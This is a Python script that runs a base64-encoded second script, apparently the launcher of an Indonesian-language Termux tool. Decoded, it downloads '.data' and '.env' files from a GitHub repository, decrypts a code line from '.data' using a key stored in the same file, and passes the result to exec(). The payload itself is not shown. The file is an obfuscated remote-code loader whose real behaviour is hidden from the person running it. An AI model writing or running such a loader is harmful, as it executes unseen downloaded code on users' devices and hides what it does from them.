import base64

encoded_script = "aW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IGJhc2U2NAppbXBvcnQgcmVxdWVzdHMKZnJvbSBhcmdwYXJzZSBpbXBvcnQgQXJndW1lbnRQYXJzZXIKZnJvbSBjcnlwdG9ncmFwaHkuZmVybmV0IGltcG9ydCBGZXJuZXQKZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMgaW1wb3J0IGhhc2hlcwpmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5rZGYucGJrZGYyIGltcG9ydCBQQktERjJITUFDCgpkZWYgZ2V0X2Zlcm5ldChrZXlfc3RyaW5nKToKICAgIHNhbHQgPSBiJ3NhbHRfJwogICAga2RmID0gUEJLREYySE1BQygKICAgICAgICBhbGdvcml0aG09aGFzaGVzLlNIQTI1NigpLAogICAgICAgIGxlbmd0aD0zMiwKICAgICAgICBzYWx0PXNhbHQsCiAgICAgICAgaXRlcmF0aW9ucz0xMDAwMDAsCiAgICApCiAgICBrZXkgPSBiYXNlNjQudXJsc2FmZV9iNjRlbmNvZGUoa2RmLmRlcml2ZShrZXlfc3RyaW5nLmVuY29kZSgpKSkKICAgIHJldHVybiBGZXJuZXQoa2V5KQpkZWYgZGVjcnlwdF9jb250ZW50KGZlcm5ldCwgZW5jcnlwdGVkX2NvbnRlbnQpOgogICAgcmV0dXJuIGZlcm5ldC5kZWNyeXB0KGVuY3J5cHRlZF9jb250ZW50KS5kZWNvZGUoKQpkZWYgdmFsaWRhdGVfZGF0YV9jb250ZW50KGVuY3J5cHRlZF9jb250ZW50cyk6CiAgICBpZiBsZW4oZW5jcnlwdGVkX2NvbnRlbnRzKSA8IDEwOgogICAgICAgIHJldHVybiBGYWxzZQogICAgdHJ5OgogICAgICAgIGlmIG5vdCBlbmNyeXB0ZWRfY29udGVudHNbM10uc3RyaXAoKS5lbmRzd2l0aChiJyAzJyk6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAgIGlmIG5vdCBlbmNyeXB0ZWRfY29udGVudHNbN10uc3RyaXAoKS5lbmRzd2l0aChiJyA3Jyk6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgZXhjZXB0IEluZGV4RXJyb3I6CiAgICAgICAgcmV0dXJuIEZhbHNlCiAgICByZXR1cm4gVHJ1ZQpkZWYgZ2V0X2xhdGVzdF92ZXJzaW9uKCk6CiAgICB0cnk6CiAgICAgICAgYXBpX3VybCA9ICJodHRwczovL2FwaS5naXRodWIuY29tL3JlcG9zL2JvY2lsLXRlcm11eC9yZXBvL2NvbnRlbnRzL2RhdGEiCiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoYXBpX3VybCkKICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgIGRpcmVjdG9yaWVzID0gW2l0ZW1bJ25hbWUnXSBmb3IgaXRlbSBpbiByZXNwb25zZS5qc29uKCkgaWYgaXRlbVsndHlwZSddID09ICdkaXInXQogICAgICAgICAgICB2ZXJzaW9ucyA9IFt2IGZvciB2IGluIGRpcmVjdG9yaWVzIGlmIHYucmVwbGFjZSgnLicsICcnKS5pc2RpZ2l0KCldCiAgICAgICAgICAgIGlmIHZlcnNpb25zOgogICAgICAgICAgICAgICAgcmV0dXJuIHNvcnRlZCh2ZXJzaW9ucywga2V5PWxhbWJkYSB4OiBbaW50KG51bSkgZm9yIG51bSBpbiB4LnNwbGl0KCcuJyldKVstMV0KICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcGFzcwogICAgcmV0dXJuIE5vbmUKZGVmIGRvd25sb2FkX2ZpbGVzKHZlcnNpb24pOgogICAgdHJ5OgogICAgICAgIGJhc2VfdXJsID0gZiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYm9jaWwtdGVybXV4L3JlcG8vbWFpbi9kYXRhL3t2ZXJzaW9ufS8iCiAgICAgICAgZGF0YV91cmwgPSBiYXNlX3VybCArICIuZGF0YSIKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldChkYXRhX3VybCkKICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgIHdpdGggb3BlbignLmRhdGEnLCAnd2InKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShyZXNwb25zZS5jb250ZW50KQogICAgICAgIGVudl91cmwgPSBiYXNlX3VybCArICIuZW52IgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KGVudl91cmwpCiAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICB3aXRoIG9wZW4oJy5lbnYnLCAnd2InKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShyZXNwb25zZS5jb250ZW50KQogICAgICAgIHJldHVybiBUcnVlCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHJldHVybiBGYWxzZQpkZWYgY2hlY2tfZm9yX3VwZGF0ZXMoKToKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cygnLmRhdGEnKToKICAgICAgICBwcmludCgiRGF0YSBrb3NvbmcsIGphbGFua2FuIHBlcmludGFoIHB5dGhvbjMgbXVsYWkucHkgLS11cGRhdGUiKQogICAgICAgIHN5cy5leGl0KDEpCiAgICB3aXRoIG9wZW4oJy5kYXRhJywgJ3JiJykgYXMgZjoKICAgICAgICBmaXJzdF9saW5lID0gZi5yZWFkbGluZSgpLmRlY29kZSgpLnN0cmlwKCkKICAgIGlmIG5vdCBmaXJzdF9saW5lLnN0YXJ0c3dpdGgoJyMgdmVyc2lvbiAnKToKICAgICAgICBwcmludCgiRGF0YSB0aWRhayB2YWxpZCwgamFsYW5rYW4gcGVyaW50YWggcHl0aG9uMyBtdWxhaS5weSAtLXVwZGF0ZSIpCiAgICAgICAgc3lzLmV4aXQoMSkKICAgIGN1cnJlbnRfdmVyc2lvbiA9IGZpcnN0X2xpbmUuc3BsaXQoJyAnKVsyXQogICAgbGF0ZXN0X3ZlcnNpb24gPSBnZXRfbGF0ZXN0X3ZlcnNpb24oKQogICAgaWYgbGF0ZXN0X3ZlcnNpb24gYW5kIGxhdGVzdF92ZXJzaW9uID4gY3VycmVudF92ZXJzaW9uOgogICAgICAgIHByaW50KGYiXG5WZXJzaSB0ZXJiYXJ1IHtsYXRlc3RfdmVyc2lvbn0gdGVyc2VkaWEgKHZlcnNpIEFuZGE6IHtjdXJyZW50X3ZlcnNpb259KSIpCiAgICAgICAgaW5wdXQoIlRla2FuIEVudGVyIHVudHVrIG1lbmRvd25sb2FkIGF0YXUgQ1RSTCtDIHVudHVrIGJhdGFsLi4uIikKICAgICAgICBpZiBkb3dubG9hZF9maWxlcyhsYXRlc3RfdmVyc2lvbik6CiAgICAgICAgICAgIHByaW50KCJWZXJzaSB0ZXJiYXJ1IHN1ZGFoIGRpZG93bmxvYWQsIGphbGFua2FuIHVsYW5nIHRvb2xzIGluaSIpCiAgICAgICAgICAgIHN5cy5leGl0KDApCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoIkdhZ2FsIG1lbmRvd25sb2FkIHZlcnNpIHRlcmJhcnUiKQogICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgIHJldHVybiBGYWxzZQpkZWYgbG9hZF9hbmRfZXhlY3V0ZSgpOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKCcuZGF0YScpOgogICAgICAgIHByaW50KCJEYXRhIGtvc29uZywgamFsYW5rYW4gcGVyaW50YWggcHl0aG9uMyBtdWxhaS5weSAtLXVwZGF0ZSIpCiAgICAgICAgc3lzLmV4aXQoMSkKICAgIHdpdGggb3BlbignLmRhdGEnLCAncmInKSBhcyBmOgogICAgICAgIGVuY3J5cHRlZF9jb250ZW50cyA9IGYucmVhZCgpLnNwbGl0KGInXG4nKQogICAgaWYgbm90IHZhbGlkYXRlX2RhdGFfY29udGVudChlbmNyeXB0ZWRfY29udGVudHMpOgogICAgICAgIHByaW50KCJEYXRhIHRpZGFrIHZhbGlkLCBqYWxhbmthbiBwZXJpbnRhaCBweXRob24zIG11bGFpLnB5IC0tdXBkYXRlIikKICAgICAgICBzeXMuZXhpdCgxKQogICAgdHJ5OgogICAgICAgIGtleV9zdHJpbmcgPSBlbmNyeXB0ZWRfY29udGVudHNbN10ucnN0cmlwKGInIDcnKS5kZWNvZGUoKQogICAgICAgIGZlcm5ldCA9IGdldF9mZXJuZXQoa2V5X3N0cmluZykKICAgICAgICBjb2RlX3RvX2V4ZWN1dGUgPSBkZWNyeXB0X2NvbnRlbnQoZmVybmV0LCBlbmNyeXB0ZWRfY29udGVudHNbM10ucnN0cmlwKGInIDMnKSkKICAgICAgICBleGVjKGNvZGVfdG9fZXhlY3V0ZSwgZ2xvYmFscygpKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBwcmludCgiRGF0YSB0aWRhayB2YWxpZCwgamFsYW5rYW4gcGVyaW50YWggcHl0aG9uMyBtdWxhaS5weSAtLXVwZGF0ZSIpCiAgICAgICAgc3lzLmV4aXQoMSkKZGVmIG1haW4oKToKICAgIHBhcnNlciA9IEFyZ3VtZW50UGFyc2VyKCkKICAgIHBhcnNlci5hZGRfYXJndW1lbnQoJy0tdXBkYXRlJywgYWN0aW9uPSdzdG9yZV90cnVlJywgaGVscD0nVXBkYXRlIHRvIGxhdGVzdCB2ZXJzaW9uJykKICAgIGFyZ3MgPSBwYXJzZXIucGFyc2VfYXJncygpCiAgICBpZiBhcmdzLnVwZGF0ZToKICAgICAgICBsYXRlc3RfdmVyc2lvbiA9IGdldF9sYXRlc3RfdmVyc2lvbigpCiAgICAgICAgaWYgbGF0ZXN0X3ZlcnNpb246CiAgICAgICAgICAgIGlmIGRvd25sb2FkX2ZpbGVzKGxhdGVzdF92ZXJzaW9uKToKICAgICAgICAgICAgICAgIHByaW50KCJWZXJzaSB0ZXJiYXJ1IHN1ZGFoIGRpZG93bmxvYWQsIGphbGFua2FuIHVsYW5nIHRvb2xzIGluaSIpCiAgICAgICAgICAgICAgICBzeXMuZXhpdCgwKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoIkdhZ2FsIG1lbmRvd25sb2FkIHZlcnNpIHRlcmJhcnUiKQogICAgICAgICAgICAgICAgc3lzLmV4aXQoMSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludCgiVGlkYWsgZGFwYXQgbWVuZW11a2FuIHZlcnNpIHRlcmJhcnUiKQogICAgICAgICAgICBzeXMuZXhpdCgxKQogICAgZWxzZToKICAgICAgICBpZiBjaGVja19mb3JfdXBkYXRlcygpOgogICAgICAgICAgICBzeXMuZXhpdCgwKQogICAgICAgIGxvYWRfYW5kX2V4ZWN1dGUoKQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigpCg=="

try:
    exec(base64.b64decode(encoded_script).decode())
except Exception as e:
    print(str(e))
